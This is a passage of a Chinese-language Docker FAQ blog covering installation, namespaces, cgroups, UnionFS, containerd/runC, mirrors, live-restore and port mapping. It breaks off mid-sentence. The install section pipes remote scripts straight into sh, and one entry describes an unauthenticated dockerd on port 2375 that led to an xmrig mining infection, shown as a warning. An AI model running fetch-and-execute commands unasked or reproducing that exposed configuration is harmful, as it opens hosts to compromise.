容器不是模拟一个完整的操作系统，而是对进程进行隔离。</strong></p><h2 id="问：如何安装-Docker？"><a href="#问：如何安装-Docker？" class="headerlink" title="问：如何安装 Docker？"></a>问：如何安装 Docker？</h2><p><strong>答：</strong> 很多人问到 <code>docker</code>, <code>docker.io</code>, <code>docker-engine</code> 甚至 <code>lxc-docker</code> 都有什么区别？<br>其中，RHEL/CentOS 软件源中的 Docker 包名为 <code>docker</code>；Ubuntu 软件源中的 Docker 包名为 <code>docker.io</code>；而很古老的 Docker 源中 Docker 也曾叫做 <code>lxc-docker</code>。这些都是非常老旧的 Docker 版本，并且基本不会更新到最新的版本，而对于使用 Docker 而言，使用最新版本非常重要。另外，17.04 以后，包名从 <code>docker-engine</code> 改为 <code>docker-ce</code>，因此从现在开始安装，应该都使用 <code>docker-ce</code>这个包。<br>正确的安装方法有两种：</p><ul><li>一种是参考官方安装文档去配置 apt 或者 yum 的源；</li><li>另一种则是使用官方提供的安装脚本快速安装。</li></ul><p>官方文档对配置源的方法已经有很详细的讲解:<a href="https://docs.docker-cn.com/engine/installation/linux/docker-ce/centos/" target="_blank" rel="noopener">官方文档地址</a></p><a id="more"></a><p><strong>17.04 及以后的版本安装方法</strong>：<br>从 <code>17.04</code> 以后，可以用下面的命令安装。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CHANNEL=stable</span><br><span class="line">curl -fsSL https://get.docker.com/ | sh -s -- --mirror Aliyun</span><br></pre></td></tr></table></figure><p>这里使用的是官方脚本安装，通过环境变量指定安装通道为 <code>stable</code>，（如果喜欢尝鲜可以改为 <code>edge</code>, <code>test</code>），并且指定使用阿里云的源(<code>apt/yum</code>)来安装 <code>Docker CE</code> 版本。</p><p><strong>17.03 及以前的版本安装方法</strong>：<br>早期的版本可以使用阿里云或者 DaoCloud 老的脚本安装：<br>使用<code>阿里云</code>的安装脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL http://acs-public-mirror.oss-cn-hangzhou.aliyuncs.com/docker-engine/internet | sh -</span><br></pre></td></tr></table></figure><p>使用<code>DaoCloud</code>的Docker安装脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/docker | sh</span><br></pre></td></tr></table></figure><p><strong>Centos7机器直接用RPM包安装方法</strong>：<br>可去阿里云寻找到最新的rpm包并下载安装：[阿里云docker rpm地址]:(<a href="https://mirrors.aliyun.com/docker-ce/linux/centos/7/x86_64/stable/Packages/" target="_blank" rel="noopener">https://mirrors.aliyun.com/docker-ce/linux/centos/7/x86_64/stable/Packages/</a>)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.aliyun.com/docker-ce/linux/centos/7/x86_64/stable/Packages/docker-ce-18.03.0.ce-1.el7.centos.x86_64.rpm -O docker-ce-18.03.0.ce-1.el7.centos.x86_64.rpm</span><br><span class="line">yum install -y container-selinux</span><br><span class="line">yum -y localinstall docker-ce-18.03.0.ce-1.el7.centos.x86_64.rpm</span><br></pre></td></tr></table></figure><h2 id="问：Docker中使用了那些核心技术？"><a href="#问：Docker中使用了那些核心技术？" class="headerlink" title="问：Docker中使用了那些核心技术？"></a>问：Docker中使用了那些核心技术？</h2><p><strong>答：</strong> <code>Linux Namespace</code>命名空间、<code>Linux CGroup</code>全称<code>Linux Control Group控制组</code>和 <code>UnionFS</code> 全称<code>Union File System联合文件系统</code>，三大技术支撑了目前 Docker 的实现，也是 Docker 能够出现的最重要原因。</p><h3 id="Linux-Namespace是Linux提供的一种内核级别环境隔离的方法。"><a href="#Linux-Namespace是Linux提供的一种内核级别环境隔离的方法。" class="headerlink" title="Linux Namespace是Linux提供的一种内核级别环境隔离的方法。"></a><code>Linux Namespace</code>是Linux提供的一种内核级别环境隔离的方法。</h3><p>通过隔离要做到的效果是：如果某个 <code>Namespace</code> 中有进程在里面运行，它们只能看到该 <code>Namespace</code> 的信息，无法看到 <code>Namespace</code> 以外的东西。Linux 的命名空间机制提供了以下七种不同的命名空间，包括<code>CLONE_NEWCGROUP</code>、<code>CLONE_NEWIPC</code>、<code>CLONE_NEWNET</code>、<code>CLONE_NEWNS</code>、<code>CLONE_NEWPID</code>、<code>CLONE_NEWUSER</code> 和 <code>CLONE_NEWUTS</code>，通过这七个选项我们能在创建新的进程时设置新进程应该在哪些资源上与宿主机器进行隔离。这些 <code>Namespace</code> 基本上覆盖了一个程序运行所需的环境，保证运行在的隔离的 <code>Namespace</code> 中的，会让程序不会受到其他收到 <code>Namespace</code>程序的干扰。但不是所有的系统资源都能隔离，时间就是个例外，没有对应的 <code>Namespace</code>，因此同一台 Linux 启动的容器时间都是相同的。</p><table><thead><tr><th>名称</th><th>宏定义</th><th>隔离的内容</th></tr></thead><tbody><tr><td>IPC</td><td>CLONE_NEWIPC</td><td>System V IPC, POSIX message queues (since Linux 2.6.19)</td></tr><tr><td>Network</td><td>CLONE_NEWNET</td><td>network device interfaces, IPv4 and IPv6 protocol stacks, IP routing tables, firewall rules, the /proc/net and /sys/class/net directory trees, sockets, etc (since Linux 2.6.24)</td></tr><tr><td>Mount</td><td>CLONE_NEWNS</td><td>Mount points (since Linux 2.4.19)</td></tr><tr><td>PID</td><td>CLONE_NEWPID</td><td>Process IDs (since Linux 2.6.24)</td></tr><tr><td>User</td><td>CLONE_NEWUSER</td><td>User and group IDs (started in Linux 2.6.23 and completed in Linux 3.8)</td></tr><tr><td>UTS</td><td>CLONE_NEWUTS</td><td>Hostname and NIS domain name (since Linux 2.6.19)</td></tr><tr><td>Cgroup</td><td>CLONE_NEWCGROUP</td><td>Cgroup root directory (since Linux 4.6)</td></tr></tbody></table><h3 id="Linux-CGroup是Linux内核用来限制，控制与分离一个进程组群的资源（如CPU、内存、磁盘输入输出等）。"><a href="#Linux-CGroup是Linux内核用来限制，控制与分离一个进程组群的资源（如CPU、内存、磁盘输入输出等）。" class="headerlink" title="Linux CGroup是Linux内核用来限制，控制与分离一个进程组群的资源（如CPU、内存、磁盘输入输出等）。"></a><code>Linux CGroup</code>是Linux内核用来限制，控制与分离一个进程组群的资源（如CPU、内存、磁盘输入输出等）。</h3><p><code>Linux CGroupCgroup</code> 可​​​让​​​您​​​为​​​系​​​统​​​中​​​所​​​运​​​行​​​任​​​务​​​（进​​​程​​​）的​​​用​​​户​​​定​​​义​​​组​​​群​​​分​​​配​​​资​​​源​​​ — 比​​​如​​​ <code>CPU 时​​​间​​​</code>、​​​<code>系​​​统​​​内​​​存​​​</code>、​​​<code>网​​​络​​​带​​​宽​​​</code>或​​​者​​​这​​​些​​​资​​​源​​​的​​​组​​​合​​​。​​​您​​​可​​​以​​​监​​​控​​​您​​​配​​​置​​​的​​​ <code>cgroup</code>，拒​​​绝​​​<code>cgroup</code> 访​​​问​​​某​​​些​​​资​​​源​​​，甚​​​至​​​在​​​运​​​行​​​的​​​系​​​统​​​中​​​动​​​态​​​配​​​置​​​您​​​的​​​ <code>cgroup</code>。<br>主要提供了如下功能：</p><ul><li><code>Resource limitation</code>: 限制进程使用的资源上限，比如最大内存、文件系统缓存使用限制。</li><li><code>Prioritization</code>: 优先级控制，比如：CPU利用和磁盘IO吞吐。</li><li><code>Accounting</code>: 一些审计或一些统计，主要目的是为了计费。</li><li><code>Control</code>: 挂起一组进程，或者重启一组进程。</li></ul><p>前面说过，<code>cgroups</code> 是用来对进程进行资源管理的，因此 <code>cgroup</code> 需要考虑如何抽象这两种概念：进程和资源，同时如何组织自己的结构。<code>cgroups</code>中有几个非常重要的概念：</p><ul><li><code>task</code>：任务，对应于系统中运行的一个实体，一般是指进程</li><li><code>subsystem</code>：子系统，具体的资源控制器（<code>resource class</code> 或者 <code>resource controller</code>），控制某个特定的资源使用。比如 CPU 子系统可以控制 CPU 时间，memory 子系统可以控制内存使用量</li><li><code>cgroup</code>：控制组，一组任务和子系统的关联关系，表示对这些任务进行怎样的资源管理策略</li><li><code>hierarchy</code>：层级树，一系列 <code>cgroup</code> 组成的树形结构。每个节点都是一个 <code>cgroup</code>，<code>cgroup</code> 可以有多个子节点，子节点默认会继承父节点的属性。系统中可以有多个 <code>hierarchy</code></li></ul><p><code>cgroups</code>为每种可以控制的资源定义了一个子系统。典型的子系统介绍如下：</p><ul><li><code>Block IO（blkio)</code>：限制块设备（磁盘、SSD、USB 等）的 IO 速率</li><li><code>CPU Set(cpuset)</code>：限制任务能运行在哪些 CPU 核上</li><li><code>CPU Accounting(cpuacct)</code>：生成 <code>cgroup</code> 中任务使用 CPU 的报告</li><li><code>CPU (CPU)</code>：限制调度器分配的 CPU 时间</li><li><code>Devices (devices)</code>：允许或者拒绝 cgroup 中任务对设备的访问</li><li><code>Freezer (freezer)</code>：挂起或者重启 cgroup 中的任务</li><li><code>Memory (memory)</code>：限制 cgroup 中任务使用内存的量，并生成任务当前内存的使用情况报告</li><li><code>Network Classifier(net_cls)</code>：为 cgroup 中的报文设置上特定的 classid 标志，这样 tc 等工具就能根据标记对网络进行配置</li><li><code>Network Priority (net_prio)</code>：对每个网络接口设置报文的优先级</li><li><code>perf_event</code>：识别任务的 cgroup 成员，可以用来做性能分析</li></ul><p>使用 <code>cgroups</code> 的方式有几种：</p><ul><li>使用 <code>cgroups</code> 提供的虚拟文件系统，直接通过创建、读写和删除目录、文件来控制 <code>cgroups</code></li><li>使用命令行工具，比如 <code>libcgroup</code>包提供的 <code>cgcreate</code>、<code>cgexec</code>、<code>cgclassify</code> 命令</li><li>使用 <code>rules engine daemon</code> 提供的配置文件</li><li>当然，<code>systemd</code>、<code>lxc</code>、<code>docker</code> 这些封装了 <code>cgroups</code> 的软件也能让你通过它们定义的接口控制 <code>cgroups</code> 的内容</li></ul><p>在实践中，系统管理员一般会利用<code>CGroup</code>做下面这些事（有点像为某个虚拟机分配资源似的）：</p><ul><li>隔离一个进程集合（比如：<code>nginx</code>的所有进程），并限制他们所消费的资源，比如绑定CPU的核。</li><li>为这组进程 分配其足够使用的内存</li><li>为这组进程分配相应的网络带宽和磁盘存储限制</li><li>限制访问某些设备（通过设置设备的白名单）</li></ul><h3 id="UnionFS就是把不同物理位置的目录合并mount到同一个目录中"><a href="#UnionFS就是把不同物理位置的目录合并mount到同一个目录中" class="headerlink" title="UnionFS就是把不同物理位置的目录合并mount到同一个目录中"></a><code>UnionFS</code>就是把不同物理位置的目录合并mount到同一个目录中</h3><p><code>UnionFS</code>其实是一种为 Linux 操作系统设计的用于把多个文件系统『联合』到同一个挂载点的文件系统服务。</p><p>操作系统中，联合挂载<code>（union mounting）</code>是一种将多个目录结合成一个目录的方式，这个目录看起来就像包含了他们结合的内容一样。</p><p>联合文件系统的实现通常辅有<code>“写时复制（CoW）”</code>的实现技术，这样任何对于底层文件系统分层的更改都会被<code>“向上拷贝”</code>到文件系统的一个临时、工作、或高层的分层里面。这个可写的层然后可以被看做是一个<code>“改动（diff）”</code>，能将之应用到下层只读的层，而这些层很可能作为底层被很多容器的进程中共享。这是一个很重要的点。</p><p>而 <code>AUFS</code> 即 <code>Advanced UnionFS</code> 其实就是 <code>UnionFS</code> 的升级版，它能够提供更优秀的性能和效率。<br><code>AUFS</code>有所有<code>Union FS</code>的特性，把多个目录，合并成同一个目录，并可以为每个需要合并的目录指定相应的权限，实时的添加、删除、修改已经被<code>mount</code>好的目录。而且，他还能在多个可写的<code>branch/dir</code>间进行负载均衡。<br><code>AUFS</code> 作为联合文件系统，它能够将不同文件夹中的层联合<code>（Union）</code>到了同一个文件夹中，这些文件夹在 <code>AUFS</code> 中称作分支，整个『联合』的过程被称为联合挂载<code>（Union Mount）</code><br><code>AUFS</code> 只是 Docker 使用的存储驱动的一种，除了 <code>AUFS</code> 之外，Docker 还支持了不同的存储驱动，包括 <code>aufs</code>、<code>devicemapper</code>、<code>overlay2</code>、<code>zfs</code> 和<code>vfs</code>等等，在最新的 Docker 中，<code>overlay2</code> 取代了 <code>aufs</code> 成为了推荐的存储驱动，但是在没有 <code>overlay2</code> 驱动的机器上仍然会使用 <code>aufs</code>作为 Docker 的默认驱动。</p><p>官方参考文档：</p><ul><li><a href="https://docs.docker.com/storage/storagedriver/select-storage-driver/#supported-backing-filesystems" target="_blank" rel="noopener">https://docs.docker.com/storage/storagedriver/select-storage-driver/#supported-backing-filesystems</a></li></ul><h2 id="问：OCI、runC-、Containerd-、Docker-shim-是什么？他们之间有怎么样的关联？"><a href="#问：OCI、runC-、Containerd-、Docker-shim-是什么？他们之间有怎么样的关联？" class="headerlink" title="问：OCI、runC 、Containerd 、Docker-shim 是什么？他们之间有怎么样的关联？"></a>问：OCI、runC 、Containerd 、Docker-shim 是什么？他们之间有怎么样的关联？</h2><p><strong>答：</strong><br>Open Container Initiative（OCI）是：</p><blockquote><p>OCI在2015年6月宣布成立，旨在围绕容器格式和运行时制定一个开放的工业化标准。OCI的目标是为了避免容器的生态分裂为“小生态王国”，确保一个引擎上构建的容器可以运行在其他引擎之上。这是实现容器可移植性至关重要的部分。只要Docker是唯一的运行时，它就是事实上的行业标准。但是随着可用（和采纳）和其他引擎，有必要从技术的角度上定义“什么是容器”，以便不同实现上可以达成最终的一致。</p></blockquote><p>runC是：</p><blockquote><p>runC是从Docker的libcontainer中迁移而来的，实现了容器启停、资源隔离等功能。runC是一个轻量级的工具，它是用来运行容器的，只用来做这一件事，并且这一件事要做好。如果你了解过Docker引擎早期的历史，你应该知道当时启动和管理一个容器需要使用LXC工具集，然后在使用libcontainer。libcontainer就是使用类似cgroup和namespace一样的Linux内核设备接口编写的一小段代码，它是容器的基本构建模块。为了是过程更加简单，runC基本上是一个小命令行工具且它可以不用通过Docker引擎，直接就可以使用容器。这是一个独立的二进制文件，使用OCI容器就可以运行它。</p></blockquote><p>Containerd是：</p><blockquote><p>Containerd是一个简单的守护进程，它可以使用runC管理容器，使用gRPC暴露容器的其他功能。相比较Docker引擎，使用gRPC，containerd暴露出针对容器的增删改查的接口，然而Docker引擎只是使用full-blown HTTP API接口对Images、Volumes、network、builds等暴露出这些方法。containerd向上为Docker Daemon提供了gRPC接口，使得Docker Daemon屏蔽下面的结构变化，确保原有接口向下兼容。向下通过containerd-shim结合runC，使得引擎可以独立升级，避免之前Docker Daemon升级会导致所有容器不可用的问题。</p></blockquote><p>Docker-shim 是：</p><blockquote><p>docker-shim是一个真实运行的容器的真实垫片载体，每启动一个容器都会起一个新的docker-shim的一个进程，<br>他直接通过指定的三个参数：容器id，boundle目录 。运行是二进制（默认为runc）来调用runc的api创建一个容器。</p></blockquote><p>它们之间的关联关系：</p><p>我们<code>ls</code>看下主机上的Docker二进制文件，会发现有<code>docker</code>,<code>dockerd</code>,<code>docker-containerd</code>,<code>docker-containerd-shim</code>,和<code>docker-containerd-ctr</code>，<code>docker-runc</code>等。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ls /usr/bin |grep docker</span><br><span class="line">docker</span><br><span class="line">docker-containerd</span><br><span class="line">docker-containerd-ctr</span><br><span class="line">docker-containerd-shim</span><br><span class="line">dockerd</span><br><span class="line">docker-init</span><br><span class="line">docker-proxy</span><br><span class="line">docker-runc</span><br></pre></td></tr></table></figure><ul><li><p><code>dockerd</code>是<code>docker engine</code>守护进程，<code>dockerd</code>启动时会启动<code>docker-containerd</code>子进程。</p></li><li><p><code>dockerd</code>与<code>docker-containerd</code>通过<code>grpc</code>进行通信。</p></li><li><p><code>docker-containerd-ctr</code>是<code>docker-containerd</code>的<code>cli</code>。</p></li><li><p><code>docker-containerd</code>通过<code>docker-containerd-shim</code>操作<code>docker-runc</code>，<code>docker-runc</code>真正控制容器生命周期 。</p></li><li><p>启动一个容器就会启动一个<code>docker-containerd-shim</code>进程。</p></li><li><p><code>docker-containerd-shim</code>直接调用<code>docker-runc</code>的包函数。</p></li><li><p>真正用户想启动的进程由<code>docker-runc</code>的<code>init</code>进程启动，即<code>runc init [args ...]</code> 。</p></li></ul><p>进程关系模型：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">docker     ctr</span><br><span class="line">  |         |</span><br><span class="line">  V         V</span><br><span class="line">dockerd -&gt; containerd ---&gt; shim -&gt; runc -&gt; runc init -&gt; process</span><br><span class="line">                      |-- &gt; shim -&gt; runc -&gt; runc init -&gt; process</span><br><span class="line">                      +-- &gt; shim -&gt; runc -&gt; runc init -&gt; process</span><br></pre></td></tr></table></figure><p><img src="https://linux7788.com/images/posts/docker-containerd-runc.png" alt="images"></p><p>Docker引擎仍然管理者<code>images</code>，然后移交给<code>containerd</code>运行，<code>containerd</code>再使用<code>runC</code>运行容器。</p><p><code>Containerd</code>只处理<code>containers</code>管理容器的开始，停止，暂停和销毁。由于容器运行时是孤立的引擎，引擎最终能够启动和升级而无需重新启动容器。</p><h2 id="问：Docker-pull-镜像如何加速？"><a href="#问：Docker-pull-镜像如何加速？" class="headerlink" title="问：Docker pull 镜像如何加速？"></a>问：Docker pull 镜像如何加速？</h2><p><strong>答：</strong>我们可以使用 Docker 镜像加速器来解决这个问题，加速器就是镜像、代理的概念。国内有不少机构提供了免费的加速器以方便大家使用，这里列出一些常用的加速器服务：</p><ul><li>Docker 官方的中国镜像加速器：从2017年6月9日起，Docker 官方提供了在中国的加速器，以解决墙的问题。不用注册，直接使用加速器地址：<code>https://registry.docker-cn.com</code> 即可。</li><li>中国科技大学的镜像加速器：中科大的加速器不用注册，直接使用地址<a href="https://docker.mirrors.ustc.edu.cn/" target="_blank" rel="noopener">https://docker.mirrors.ustc.edu.cn/</a>配置加速器即可。进一步的信息可以访问：<a href="http://mirrors.ustc.edu.cn/help/dockerhub.html?highlight=docker" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/help/dockerhub.html?highlight=docker</a></li><li>阿里云加速器：注册阿里云开发账户(免费的)后，访问这个链接就可以看到加速器地址： <a href="https://cr.console.aliyun.com/#/accelerator" target="_blank" rel="noopener">https://cr.console.aliyun.com/#/accelerator</a></li><li>DaoCloud 加速器：注册 DaoCloud 账户(支持微信登录)，然后访问： <a href="https://www.daocloud.io/mirror#accelerator-doc" target="_blank" rel="noopener">https://www.daocloud.io/mirror#accelerator-doc</a><br>当然你也可以自己搞个梯子。</li></ul><h2 id="问：如果-Docker-升级或者重启的话，那容器是不是都会被停掉然后重启啊？"><a href="#问：如果-Docker-升级或者重启的话，那容器是不是都会被停掉然后重启啊？" class="headerlink" title="问：如果 Docker 升级或者重启的话，那容器是不是都会被停掉然后重启啊？"></a>问：如果 Docker 升级或者重启的话，那容器是不是都会被停掉然后重启啊？</h2><p><strong>答：</strong>在 <code>1.12</code> 以前的版本确实如此，但是从 <code>1.12</code> 开始，Docker 引擎加入了 <code>--live-restore</code> 参数，使用该参数可以避免引擎升级、重启导致容器停止服务的情况。<br>默认情况该功能不会被启动，如需启动，需要配置 <code>docker</code> 服务配置文件。比如 <code>Centos 7.3</code> 这类 <code>systemd</code> 的系统，可以修改 <code>/usr/lib/systemd/system/docker.servic</code>e 文件，在 <code>ExecStart=</code> 后面配置上 <code>--live-restore</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExecStart=/usr/bin/dockerd \</span><br><span class="line">    --registry-mirror=https://registry.docker-cn.com \</span><br><span class="line">    --live-restore</span><br></pre></td></tr></table></figure><p>上面的格式中使用了行尾 <code>\</code> 的换行形式，这点和 <code>bash</code> 脚本一样，<code>systemd</code> 支持这种换行形式，如对此不了解可以先去学习 <code>bash</code> 程序设计。<br>需要注意的是，<code>--live-restore</code> 和 <code>Swarm Mode</code> 不兼容，所以在集群环境中不要使用。实际上集群环境也不用担心某个服务器重启的问题，因为其上的服务都会被调度到别的节点上，因此服务并不会被中断。</p><p>官方参考文档：</p><ul><li><a href="https://docs.docker.com/config/containers/live-restore/#enable-live-restore" target="_blank" rel="noopener">https://docs.docker.com/config/containers/live-restore/#enable-live-restore</a></li></ul><h2 id="问：服务器上线后，怎么发现总有个-xmrig-的容器在跑，删了还出来，这是什么鬼？"><a href="#问：服务器上线后，怎么发现总有个-xmrig-的容器在跑，删了还出来，这是什么鬼？" class="headerlink" title="问：服务器上线后，怎么发现总有个 xmrig 的容器在跑，删了还出来，这是什么鬼？"></a>问：服务器上线后，怎么发现总有个 <code>xmrig</code> 的容器在跑，删了还出来，这是什么鬼？</h2><p><strong>警告！！你的服务器已经被入侵了！！</strong></p><p><strong>答：</strong>有些人服务器上线后，发现突然多了一些莫名奇妙的容器在跑。比如下面这个例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps -a</span><br><span class="line">IMAGE           COMMAND                  CREATED      STATUS                      PORTS    NAMES</span><br><span class="line">linuxrun/cpu2   <span class="string">"./xmrig --algo=cr...."</span>  4 hours ago  Exited (137) 7 minutes ago           linuxrun-cpu2</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这就是有人在你的 Docker 宿主上跑了一个 <code>xmrig</code> 挖矿的蠕虫，因为你的系统被入侵了……。<br>在你大叫 Docker 不安全之前，先检讨一下自己是不是做错了。检查一下 <code>dockerd</code> 引擎是否配置错误：<code>ps -ef | grep dockerd</code>，如果你看到的是这样子的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ps -ef | grep dockerd</span><br><span class="line">123  root   12:34   /usr/bin/dockerd -H unix:///var/run/docker.sock -H tcp://0.0.0.0:2375</span><br></pre></td></tr></table></figure><p>如果在其中没有 <code>--tlsverify</code> 类的 TLS 配置参数，那就说明你将你的系统大门彻底敞开了。这是配置上<strong>严重的安全事故</strong>。</p><p><code>-H tcp://0.0.0.0:2375</code> 是说你希望通过 <code>2375/tcp</code> 来操控你的 Docker 引擎，但是如果你没有加 <code>--tlsverify</code> 类的配置，就表明你的意图是允许任何人来操控你的 Docker 引擎，而 Docker 引擎是以 <code>root</code> 权限运行的，因此，你等于给了地球上所有人你服务器的 <code>root</code> 权限，而且还没密码。</p><p>如果细心一些，去查看 dockerd 的服务日志，journalctl -u docker，日志中有明确的警告，警告你这么配置是极端危险的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ journalctl -u docker</span><br><span class="line">...</span><br><span class="line">level=warning msg=<span class="string">"[!] DON'T BIND ON ANY IP ADDRESS WITHOUT setting --tlsverify IF YOU DON'T KNOW WHAT YOU'RE DOING [!]"</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>如果这些你都忽略了，那么被别人入侵就太正常了，是你自己邀请别人来的。所以，Docker 服务绑定端口，必须通过 TLS 保护起来，以后见到 <code>-H tcp://....</code>就要检查，是否同时配置了 <code>--tlsverify</code>，如果没看到，那就是严重错误了。<br>这也是为什么推荐使用 <code>docker-machine</code> 进行 Docker 宿主管理的原因，因为 <code>docker-machine</code> 会帮你创建证书、配置 TLS，确保服务器的安全。</p><p>进一步如何配置 TLS 的信息，可以查看官网文档：</p><ul><li><a href="https://docs.docker.com/engine/security/https/" target="_blank" rel="noopener">https://docs.docker.com/engine/security/https/</a></li></ul><p>关于 <code>docker-machine</code> 的介绍，可以看官网文档：</p><ul><li><a href="https://docs.docker.com/machine/overview/" target="_blank" rel="noopener">https://docs.docker.com/machine/overview/</a></li></ul><h2 id="问：怎么固定容器-IP-地址？每次重启容器都要变化-IP-地址怎么办？"><a href="#问：怎么固定容器-IP-地址？每次重启容器都要变化-IP-地址怎么办？" class="headerlink" title="问：怎么固定容器 IP 地址？每次重启容器都要变化 IP 地址怎么办？"></a>问：怎么固定容器 IP 地址？每次重启容器都要变化 IP 地址怎么办？</h2><p><strong>答：</strong>一般情况是不需要指定容器 IP 地址的。这不是虚拟主机，而是容器。其地址是供容器间通讯的，容器间则不用 IP 直接通讯，而使用容器名、服务名、网络别名。</p><p>为了保持向后兼容，<code>docker run</code> 在不指定 <code>--network</code> 时，所在的网络是 <code>default bridge</code>，在这个网络下，需要使用 <code>--link</code>参数才可以让两个容器找到对方。</p><p>这是有局限性的，因为这个时候使用的是 <code>/etc/hosts</code> 静态文件来进行的解析，比如一个主机挂了后，重新启动IP可能会改变。虽然说这种改变Docker是可能更新<code>/etc/hosts</code>文件，但是这有诸多问题，可能会因为竞争冒险导致 <code>/etc/hosts</code> 文件损毁，也可能还在运行的容器在取得 <code>/etc/hosts</code> 的解析结果后，不再去监视该文件是否变动。种种原因都可能会导致旧的主机无法通过容器名访问到新的主机。</p><p>参考官网文档：</p><ul><li><a href="https://docs.docker.com/engine/userguide/networking/default_network/dockerlinks/" target="_blank" rel="noopener">https://docs.docker.com/engine/userguide/networking/default_network/dockerlinks/</a></li></ul><p>如果可能不要使用这种过时的方式，而是用下面说的自定义网络的方式。</p><p>而对于新的环境（<code>Docker 1.10</code>以上），应该给容器建立自定义网络，同一个自定义网络中，可以使用对方容器的容器名、服务名、网络别名来找到对方。这个时候帮助进行服务发现的是Docker 内置的DNS。所以，无论容器是否重启、更换IP，内置的DNS都能正确指定到对方的位置。<br>参考官网文档：</p><ul><li><a href="https://docs.docker.com/engine/userguide/networking/work-with-networks/#linking-containers-in-user-defined-networks" target="_blank" rel="noopener">https://docs.docker.com/engine/userguide/networking/work-with-networks/#linking-containers-in-user-defined-networks</a></li></ul><h2 id="问：如何修改容器的-etc-hosts-文件？"><a href="#问：如何修改容器的-etc-hosts-文件？" class="headerlink" title="问：如何修改容器的 /etc/hosts 文件？"></a>问：如何修改容器的 /etc/hosts 文件？</h2><p><strong>答：</strong>容器内的 <code>/etc/hosts</code> 文件不应该被随意修改，如果必须添加主机名和 IP 地址映射关系，应该在 <code>docker run</code> 时使用 <code>--add-host</code> 参数，或者在 <code>docker-compose.yml</code> 中添加 <code>extra_hosts</code> 项。</p><p>不过在用之前，应该再考虑一下真的需要修改 <code>/etc/hosts</code> 么？如果只是为了容器间互相访问，应该建立自定义网络，并使用 Docker 内置的 DNS 服务。</p><h2 id="问：怎么映射宿主端口？Dockerfile-中的EXPOSE和-docker-run-p-有啥区别？"><a href="#问：怎么映射宿主端口？Dockerfile-中的EXPOSE和-docker-run-p-有啥区别？" class="headerlink" title="问：怎么映射宿主端口？Dockerfile 中的EXPOSE和 docker run -p 有啥区别？"></a>问：怎么映射宿主端口？Dockerfile 中的EXPOSE和 docker run -p 有啥区别？</h2><p><strong>答：</strong>Docker中有两个概念，一个叫做 <code>EXPOSE</code> ，一个叫做 <code>PUBLISH</code> 。</p><ul><li><code>EXPOSE</code> 是镜像/容器声明要暴露该端口，可以供其他容器使用。这种声明，在没有设定 <code>--icc=false</code>的时候，实际上只是一种标注，并不强制。也就是说，没有声明 <code>EXPOSE</code> 的端口，其它容器也可以访问。但是当强制 <code>--icc=false</code> 的时候，那么只有 <code>EXPOSE</code> 的端口，其它容器才可以访问。</li><li><code>PUBLISH</code> 则是通过映射宿主端口，将容器的端口公开于外界，也就是说宿主之外的机器，可以通过访问宿主IP及对应的该映射端口，访问到容器对应端口，从而使用容器服务。</li></ul><p><code>EXPOSE</code> 的端口可以不 <code>PUBLISH</code>，这样只有容器间可以访问，宿主之外无法访问。而 <code>PUBLISH</code> 的端口，可以不事先 <code>EXPOSE</code>，换句话说 <code>PUBLISH</code> 等于同时隐式定义了该端口要 <code>EXPOSE</code>。</p><p><code>docker run</code> 命令中的 <code>-p</code>, <code>-P</code> 参数，以及 <code>docker-compose.yml</code> 中的  <code>ports</code> 部分，实际上均是指 <code>PUBLISH</code>。</p><p>小写 <code>-p</code> 是端口映射，格式为 <code>[宿主IP:]&lt;宿主端口&gt;:&lt;容器端口&gt;</code>，其中宿主端口和容器端口，既可以是一个数字，也可以是一个范围，比如：<code>1000-2000:1000-2000</code>。对于多宿主的机器，可以指定宿主<code>IP</code>，不指定宿主<code>IP</code>时，守护所有接口。</p><p>大写 <code>-P</code>则是自动映射，将所有定义 <code>EXPOSE</code> 的端口，随机映射到宿主的某个端口。</p><h2 id="问：我要映射好几百个端口，难道要一个个-p-么？"><a href="#问：我要映射好几百个端口，难道要一个个-p-么？" class="headerlink" title="问：我要映射好几百个端口，难道要一个个   -p 么？"></a>问：我要映射好几百个端口，难道要一个个   <code>-p</code> 么？</h2><p><strong>答：</strong> <code>-p</code> 是可以用范围的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-p 8001-8010:8001-8010</span><br></pre></td></tr></table></figure><h2 id="问：为什么-p-后还是无法通过映射端口访问容器里面的服务？"><a href="#问：为什么-p-后还是无法通过映射端口访问容器里面的服务？" class="headerlink" title="问：为什么 -p 后还是无法通过映射端口访问容器里面的服务？"></a>问：为什么 <code>-p</code> 后还是无法通过映射端口访问容器里面的服务？</h2><p><strong>答：</strong> 首先，当然是检查这个 <code>docker</code> 